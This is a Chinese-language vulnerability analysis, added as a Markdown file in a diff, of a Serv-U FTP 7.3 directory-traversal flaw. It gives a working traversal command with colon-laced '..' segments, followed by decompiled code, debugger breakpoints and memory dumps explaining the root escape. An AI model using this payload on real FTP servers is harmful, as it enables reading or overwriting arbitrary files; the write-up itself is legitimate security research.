@@ -1,0 +1,199 @@
+
+# Serv-U FTP Server Jail Break 0day 分析
+
+> 原文：[`www.pediy.com/kssd/pediy12/143717.html`](https://www.pediy.com/kssd/pediy12/143717.html)
+
+Serv-U FTP Server Jail Break 0day 分析 Author: instruder of Code Audit Labs of vulnhunt.com
+
+测试版本 `Serv-U FTP Server v7.3`
+
+测试 `ftp` 根目录 `c:\\testftp`
+
+测试命令
+
+```
+ftp> ls "-a ..:\\..:\\kankan"
+200 PORT Command successful.
+150 Opening ASCII mode data connection for /bin/ls.
+.
+..
+1.txt
+upgrade_cache.cfg
+226 Transfer complete. 33 bytes transferred. 2.01 KB/sec.
+ftp: 收到 33 字节，用时 0.06 秒 0.58 千字节/秒。
+```
+
+常见的目录遍历测试大家都会用常见的命令例如  
+`../../../`  
+`..\\..\\..\\`  
+`..//..//..//` 等等去测试 但是这个漏洞里面竟然需要有 `：` 令我很诧异
+
+以 `ls` 命令为例
+
+流程  
+`CFTPCommand__ProcessCommand` > `CFTPCommandProcessor::ProcessCommand` -> `CFTPCommand::ProcessCommand` -> `CFTPCmdLIST::ProcessCommand` -> `CSUString__MakeFullPath` -> `CUser::CheckPermissions`.
+
+这个 ftp-u 完全是 c++ 写的，各种容器各种库，导致就算简单请求路径如何传播的也花费了很大的力气才找到关键的地方。
+
+相关打印断点
+
+```
+0 e 1004d8ea 0001 (0001) 0:\\\\* Serv_U_10000000!CSUString::MakeLower+0x4d31 ".if(1){db poi(edi+0x10);gc}"
+1 e 1004bae1 0001 (0001) 0:\\\\* Serv_U_10000000!CSUString::MakeLower+0x2f28
+2 e 1005e048 0001 (0001) 0:\\\\* Serv_U_10000000!CSUString::MakeFullPath+0x17c
+4 e 1004ba87 0001 (0001) 0:\\\\* Serv_U_10000000!CSUString::MakeLower+0x2ece
+5 e 1004d553 0001 (0001) 0:\\\\* Serv_U_10000000!CSUString::MakeLower+0x499a
+6 e 71a2676f 0001 (0001) 0:\\\\* WS2_32!recv ".if(1){db poi(esp+8);gc}"
+7 e 1005dfc8 0001 (0001) 0:\\\\* Serv_U_10000000!CSUString::MakeFullPath+0xfc ".if(1){.echo buildpath;db poi(eax+4)}"
+9 e 71a24c27 0001 (0001) 0:\\\\* WS2_32!send ".if(1){db poi(esp+8);kb;gc}"
+12 e 1005e325 0001 (0001) 0:\\\\* Serv_U_10000000!CSUString::MakeFullPath+0x459 ".if(1){db poi(ecx)}"
+16 e 10064b55 0001 (0001) 0:\\\\* Serv_U_10000000!CFTPCommand::ProcessCommand+0x28 ".if(1){db poi(poi(esp)+4)}"
+17 e 10070c41 0001 (0001) 0:\\\\* Serv_U_10000000!CFTPCmdLIST::ProcessCommand+0x66 ".if(1){db poi(poi([esp+4])+4)}"
+19 e 1005737b 0001 (0001) 0:\\\\* Serv_U_10000000!SeparateLines+0x9da ".if(1){db poi(eax+4)}"
+20 e 1005e7e6 0001 (0001) 0:\\\\* Serv_U_10000000!CMibInternetConnection::GetIpAddr+0x202 ".if(1){db poi(poi(esp)+4)}"
+21 e 1005eb54 0001 (0001) 0:\\\\* Serv_U_10000000!CMibInternetConnection::GetIpAddr+0x570 ".if(1){db poi(poi(esp)+4)}"
+24 e 1005ea5d 0001 (0001) 0:\\\\* Serv_U_10000000!CMibInternetConnection::GetIpAddr+0x479 ".if(1){db poi(ebp-10)}"
+25 e 10057373 0001 (0001) 0:\\\\* Serv_U_10000000!SeparateLines+0x9d2 ".if(1){db poi(poi(esp)+4);db poi(poi(esp+4)+4)}"
+27 e 100575ab 0001 (0001) 0:\\\\* Serv_U_10000000!SeparateLines+0xc0a
+32 e 10057136 0001 (0001) 0:\\\\* Serv_U_10000000!SeparateLines+0x795 ".if(1){db poi(eax+4)}"
+```
+
+## 漏洞成因
+
+1 首先 ftp-u 当请求路径中发现 `..\\` `../` 都会转化成 `..\` 会自动学习 windows 一样进行路径反转如请求这样的 `ls "-a ..\\..\\*"` 则最终变成 `C:\\*..\\*` 请求这样的路径
+
+请求 `ls "-a ..\\..\\kankan"` 会变成 `C:\\kankan` （路径反转之后会进行权限检查发现比对目录前面不是根目录就返回 No such file or directory）。
+
+应代码 `C in CSUString__MakeFullPath`
+
+```
+for ( i = (int)"\\\\..\\\\"; ; i = (int)"\\\\..\\\\" )
+{
+  v21 = ATL__CStringT_char_StrTraitMFC_DLL_char_ATL__ChTraitsCRT_char______Find(&v33);//循环查找’..\\’
+  v22 = v21;
+  if ( v21 == -1 )
+    break;
+  v20 = sub_100A7698(L"\\\\", v21);
+  if ( v20 == -1 )
+  {
+    if ( (_BYTE)a5 || !a6 )
+    {
+      v35 = v18;
+      i = v22 + 1;
+    }
+    else
+    {
+      v35 = v18 + v22;
+      i = 0;
+    }
+  }
+  else
+  {
+    v35 = v18 + v22 - v20;
+    i = v20 + 1;
+  }
+  ATL__CStringT_char_StrTraitMFC_DLL_char_ATL__ChTraitsCRT_char______Delete(&v33);
+  v35 = 0;
+}
+```
+
+2 上述处理之后，但是同时若路径中含有 `：` 时 则自动去掉这个 `：`
+
+代码:
+
+```
+C in CSUString__MakeFullPath
+  while ( 1 )
+  {
+    v35 = a5;
+
+    v27 = ATL__CStringT_char_StrTraitMFC_DLL_char_ATL__ChTraitsCRT_char______Find(&v33);
+    if ( v27 == -1 ) // 没找到
+      break;
+    if ( sub_100A7298((int)&v32, v27 + 1, 92) && sub_100A68FA(&v32) == v27 + 2 )
+      break;
+    v35 = 1;
+    i = v27;
+    ATL__CStringT_char_StrTraitMFC_DLL_char_ATL__ChTraitsCRT_char______Delete(&v33);
+  }
+```
+
+但是去掉之后并没有在重新进行路径反转检查
+
+如下
+
+代码:
+
+
+
+Buildpath 首先连接根目录和请求路径
+
+```
+01e88da0  43 3a 5c 74 65 73 74 66-74 70 5c 2e 2e 3a 5c 2e  C:\\testftp\\..:\\.
+01e88db0  2e 3a 5c 6b 61 6e 6b 61-6e 00 6c 2e 00 7e e8 01  .:\\kankan.l..~..
+01e88dc0  07 00 07 00 af 01 0b 04-38 8e e8 01 1c 00 00 00  ........8.......
+01e88dd0  1c 00 00 00 00 00 00 00-32 30 30 20 50 4f 52 54  ........200 PORT
+01e88de0  20 43 6f 6d 6d 61 6e 64-20 73 75 63 63 65 73 73   Command success
+01e88df0  66 75 6c 2e 00 0a 00 00-07 00 07 00 a8 01 0b 04  ful.............
+01e88e00  70 8e e8 01 1c 00 00 00-1c 00 00 00 00 00 00 00  p...............
+01e88e10  32 30 30 20 50 4f 52 54-20 43 6f 6d 6d 61 6e 64  200 PORT Command
+eax=0012f870 ebx=0000005c ecx=1005dc0f edx=e8fe0098 esi=0012f914 edi=100e7fd0
+eip=1005dfc8 esp=0012f860 ebp=0012f88c iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+Serv\_U\_10000000!CSUString::MakeFullPath+0xfc:
+1005dfc8 e95e010000      jmp     Serv\_U\_10000000!CSUString::MakeFullPath+0x25f (1005e12b)
+0:000> g    //路径反转 没有发现 ‘../ ‘ 未做反转 
+01e88da0  43 3a 5c 74 65 73 74 66-74 70 5c 2e 2e 3a 5c 2e  C:\\testftp\\..:\\.
+01e88db0  2e 3a 5c 6b 61 6e 6b 61-6e 5c 00 2e 00 7e e8 01  .:\\kankan\\...~..
+01e88dc0  07 00 07 00 af 01 0b 04-38 8e e8 01 1c 00 00 00  ........8.......
+01e88dd0  1c 00 00 00 00 00 00 00-32 30 30 20 50 4f 52 54  ........200 PORT
+01e88de0  20 43 6f 6d 6d 61 6e 64-20 73 75 63 63 65 73 73   Command success
+01e88df0  66 75 6c 2e 00 0a 00 00-07 00 07 00 a8 01 0b 04  ful.............
+01e88e00  70 8e e8 01 1c 00 00 00-1c 00 00 00 00 00 00 00  p...............
+01e88e10  32 30 30 20 50 4f 52 54-20 43 6f 6d 6d 61 6e 64  200 PORT Command
+eax=00000001 ebx=00000003 ecx=0012f874 edx=004c2b04 esi=0012f914 edi=100f4268
+eip=1005e325 esp=0012f858 ebp=0012f88c iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+Serv\_U\_10000000!CSUString::MakeFullPath+0x459:
+1005e325 ff1508630e10    call    dword ptr \[Serv\_U\_10000000!CResourceDialog::GetComboBoxValues+0x27a9f (100e6308)\] ds:0023:100e6308=781f488e
+0:000> g    //去掉第一个 ‘ : ’
+01e88da0  43 3a 5c 74 65 73 74 66-74 70 5c 2e 2e 5c 2e 2e  C:\\testftp\\..\\..
+01e88db0  3a 5c 6b 61 6e 6b 61 6e-5c 00 00 2e 00 7e e8 01  :\\kankan\\....~..
+01e88dc0  07 00 07 00 af 01 0b 04-38 8e e8 01 1c 00 00 00  ........8.......
+01e88dd0  1c 00 00 00 00 00 00 00-32 30 30 20 50 4f 52 54  ........200 PORT
+01e88de0  20 43 6f 6d 6d 61 6e 64-20 73 75 63 63 65 73 73   Command success
+01e88df0  66 75 6c 2e 00 0a 00 00-07 00 07 00 a8 01 0b 04  ful.............
+01e88e00  70 8e e8 01 1c 00 00 00-1c 00 00 00 00 00 00 00  p...............
+01e88e10  32 30 30 20 50 4f 52 54-20 43 6f 6d 6d 61 6e 64  200 PORT Command
+eax=00000019 ebx=0000000d ecx=0012f874 edx=01e88da0 esi=0012f914 edi=100f4268
+eax=00000019 ebx=0000000d ecx=0012f874 edx=01e88da0 esi=0012f914 edi=100f4268
+eip=1005e325 esp=0012f858 ebp=0012f88c iopl=0         nv up ei ng nz ac po cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
+Serv\_U\_10000000!CSUString::MakeFullPath+0x459:
+1005e325 ff1508630e10    call    dword ptr \[Serv\_U\_10000000!CResourceDialog::GetComboBoxValues+0x27a9f (100e6308)\] ds:0023:100e6308=781f488e
+0:000> g    去掉第二个 ‘ : ’
+01e88da0  43 3a 5c 74 65 73 74 66-74 70 5c 2e 2e 5c 2e 2e  C:\\testftp\\..\\..
+01e88db0  5c 6b 61 6e 6b 61 6e 5c-00 00 00 2e 00 7e e8 01  \\kankan\\.....~..
+01e88dc0  07 00 07 00 af 01 0b 04-38 8e e8 01 1c 00 00 00  ........8.......
+01e88dd0  1c 00 00 00 00 00 00 00-32 30 30 20 50 4f 52 54  ........200 PORT
+01e88de0  20 43 6f 6d 6d 61 6e 64-20 73 75 63 63 65 73 73   Command success
+01e88df0  66 75 6c 2e 00 0a 00 00-07 00 07 00 a8 01 0b 04  ful.............
+01e88e00  70 8e e8 01 1c 00 00 00-1c 00 00 00 00 00 00 00  p...............
+01e88e10  32 30 30 20 50 4f 52 54-20 43 6f 6d 6d 61 6e 64  200 PORT Command
+eax=00000018 ebx=00000010 ecx=0012f874 edx=01e88da0 esi=0012f914 edi=100f4268
+eip=1005e325 esp=0012f858 ebp=0012f88c iopl=0         nv up ei ng nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297
+Serv\_U\_10000000!CSUString::MakeFullPath+0x459:
+1005e325 ff1508630e10    call    dword ptr \[Serv\_U\_10000000!CResourceDialog::GetComboBoxValues+0x27a9f (100e6308)\] ds:0023:100e6308=781f488e
+```
+
+最后形成 `C:\\testftp\\..\\..\\kankan\\` 的路径进入 `CUser::CheckPermissions` 进行检查，检测是否在根目录 `c:\\testftp` 下 符合条件 最终导致远程目录遍历漏洞 可以覆盖，下载任意文件![](img/906f120cfe711ccbc8463fd6eb86eee9.jpg "尴尬")
+
+ps:发现 发这个漏洞的人 Kingcope 真牛逼啊 找的全是远程的漏洞 iis apache nginx 各种 ftp ...![](img/d23858dd221cce728a3a61b46badb044.jpg "恐怖!")![](img/d23858dd221cce728a3a61b46badb044.jpg "恐怖!")膜拜
+
+ref:http://www.exploit-db.com/exploits/18182/
+
+上传的附件
+
+| ![](img/67af4f1ef9c98996f43e89e749c7dcf5.jpg) || Serv-U FTP Server Jail Break 0day 分析.rar |
+
